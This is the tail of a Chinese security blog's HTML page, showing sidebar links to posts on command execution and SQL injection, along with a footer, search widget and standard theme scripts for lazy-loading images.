15:14:44">2024-04-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/undefined/46b9/" title="命令执行&amp;代码执行（完善中...）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="命令执行&amp;代码执行（完善中...）"/></a><div class="content"><a class="title" href="/undefined/46b9/" title="命令执行&amp;代码执行（完善中...）">命令执行&amp;代码执行（完善中...）</a><time datetime="2024-04-14T07:12:51.431Z" title="发表于 2024-04-14 15:12:51">2024-04-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/undefined/f8b7/" title="SQL注入（完善中...）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入（完善中...）"/></a><div class="content"><a class="title" href="/undefined/f8b7/" title="SQL注入（完善中...）">SQL注入（完善中...）</a><time datetime="2024-04-14T06:05:13.517Z" title="发表于 2024-04-14 14:05:13">2024-04-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/2.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 By Qu4rt3r77</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script src="/js/random_essay.js?1"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div>
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body></html>
